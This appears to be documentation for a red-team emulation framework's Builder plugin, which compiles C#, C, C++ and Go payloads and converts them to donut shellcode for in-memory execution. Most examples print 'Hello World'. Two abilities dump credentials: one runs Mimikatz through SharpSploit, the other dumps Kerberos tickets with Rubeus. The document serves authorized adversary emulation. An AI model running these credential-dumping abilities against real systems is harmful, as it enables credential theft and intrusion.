# Dynamically-Compiled Payloads

The [Builder](Plugin-library.md#builder) plugin can be used to create dynamically-compiled payloads. Currently, the plugin supports C#, C, C++, and Golang.

Code is compiled in a Docker container. The resulting executable, along with any additional references, will be copied to the remote machine and executed.

Details for the available languages are below:

- `csharp`: Compile C# executable using Mono
- `cpp_windows_x64`: Compile 64-bit Windows C++ executable using MXE/MinGW-w64
- `cpp_windows_x86`: Compile 64-bit Windows C++ executable using MXE/MinGW-w64
- `c_windows_x64`: Compile 64-bit Windows C executable using MXE/MinGW-w64
- `c_windows_x86`: Compile 64-bit Windows C executable using MXE/MinGW-w64
- `go_windows`: Build Golang executable for Windows

### Basic Example

The following "Hello World" ability can be used as a template for C# ability development:

```yaml
---

- id: 096a4e60-e761-4c16-891a-3dc4eff02e74
  name: Test C# Hello World
  description: Dynamically compile HelloWorld.exe
  tactic: execution
  technique:
    attack_id: T1059
    name: Command-Line Interface
  platforms:
    windows:
      psh,cmd:
        build_target: HelloWorld.exe
        language: csharp
        code: |
          using System;

          namespace HelloWorld
          {
              class Program
              {
                  static void Main(string[] args)
                  {
                      Console.WriteLine("Hello World!");
                  }
              }
          }
```

It is possible to reference a source code file as well. The source code file should be in the plugin's `payloads/` directory. This is shown in the example below:

```yaml
---

- id: 096a4e60-e761-4c16-891a-3dc4eff02e74
  name: Test C# Hello World
  description: Dynamically compile HelloWorld.exe
  tactic: execution
  technique:
    attack_id: T1059
    name: Command-Line Interface
  platforms:
    windows:
      psh,cmd:
        build_target: HelloWorld.exe
        language: csharp
        code: HelloWorld.cs
```

### Advanced Examples

#### Arguments

It is possible to call dynamically-compiled executables with command line arguments by setting the ability `command` value. This allows for the passing of facts into the ability. The following example demonstrates this:

```yaml
---

- id: ac6106b3-4a45-4b5f-bebf-0bef13ba7c81
  name: Test C# Code with Arguments
  description: Hello Name
  tactic: execution
  technique:
    attack_id: T1059
    name: Command-Line Interface
  platforms:
    windows:
      psh,cmd:
        build_target: HelloName.exe
        command: .\HelloName.exe "#{paw}"
        language: csharp
        code: |
          using System;

          namespace HelloWorld
          {
              class Program
              {
                  static void Main(string[] args)
                  {
                      if (args.Length == 0) {
                          Console.WriteLine("No name provided");
                      }
                      else {
                        Console.WriteLine("Hello " + Convert.ToString(args[0]));
                      }
                  }
              }
          }
```

#### DLL Dependencies

DLL dependencies can be added, at both compilation and execution times, using the ability `payload` field. The referenced library should be in a plugin's `payloads` folder, the same as any other payload.

The following ability references `SharpSploit.dll` and dumps logon passwords using Mimikatz:

```yaml
---

- id: 16bc2258-3b67-46c1-afb3-5269b6171c7e
  name: SharpSploit Mimikatz (DLL Dependency)
  description: SharpSploit Mimikatz
  tactic: credential-access
  technique:
    attack_id: T1003
    name: Credential Dumping
  privilege: Elevated
  platforms:
    windows:
      psh,cmd:
        build_target: CredDump.exe
        language: csharp
        code: |
          using System;
          using System.IO;
          using SharpSploit;

          namespace CredDump
          {
              class Program
              {
                  static void Main(string[] args)
                  {
                      SharpSploit.Credentials.Mimikatz mimi = new SharpSploit.Credentials.Mimikatz();
                      string logonPasswords = SharpSploit.Credentials.Mimikatz.LogonPasswords();
                      Console.WriteLine(logonPasswords);
                  }
              }
          }
        parsers:
          plugins.stockpile.app.parsers.katz:
            - source: domain.user.name
              edge: has_password
              target: domain.user.password
            - source: domain.user.name
              edge: has_hash
              target: domain.user.ntlm
            - source: domain.user.name
              edge: has_hash
              target: domain.user.sha1
  payloads:
    - SharpSploit.dll
```

#### Donut

The `donut` gocat extension is required to execute donut shellcode.

The `donut_amd64` executor combined with a `build_target` value ending with `.donut`, can be used to generate shellcode using [donut](https://github.com/TheWover/donut). Payloads will first be dynamically-compiled into .NET executables using Builder, then converted to donut shellcode by a Stockpile payload handler. The `.donut` file is downloaded to memory and injected into a new process by the sandcat agent.

The `command` field can, optionally, be used to supply command line arguments to the payload. In order for the sandcat agent to properly execute the payload, the `command` field must either begin with the `.donut` file name, or not exist.

The following example shows donut functionality using the optional `command` field to pass arguments:

```yaml
---

- id: 7edeece0-9a0e-4fdc-a93d-86fe2ff8ad55
  name: Test Donut with Arguments
  description: Hello Name Donut
  tactic: execution
  technique:
    attack_id: T1059
    name: Command-Line Interface
  platforms:
    windows:
      donut_amd64:
        build_target: HelloNameDonut.donut
        command: .\HelloNameDonut.donut "#{paw}" "#{server}"
        language: csharp
        code: |
          using System;

          namespace HelloNameDonut
          {
              class Program
              {
                  static void Main(string[] args)
                  {
                      if (args.Length < 2) {
                          Console.WriteLine("No name, no server");
                      }
                      else {
                        Console.WriteLine("Hello " + Convert.ToString(args[0]) + " from " + Convert.ToString(args[1]));
                      }
                  }
              }
          }
```

Donut can also be used to read from pre-compiled executables. .NET Framework 4 is required. Executables will be found with either a `.donut.exe` or a `.exe` extension, and `.donut.exe` extensions will be prioritized. The following example will transform a payload named `Rubeus.donut.exe` into shellcode which will be executed in memory. Note that `Rubeus.donut` is specified in the payload and command:

```yaml
---

- id: 043d6200-0541-41ee-bc7f-bcc6ba15facd
  name: TGT Dump
  description: Dump TGT tickets with Rubeus
  tactic: credential-access
  technique:
    attack_id: T1558
    name: Steal or Forge Kerberos Tickets
  privilege: Elevated
  platforms:
    windows:
      donut_amd64:
        command: .\Rubeus.donut dump /nowrap
        payloads:
        - Rubeus.donut
```
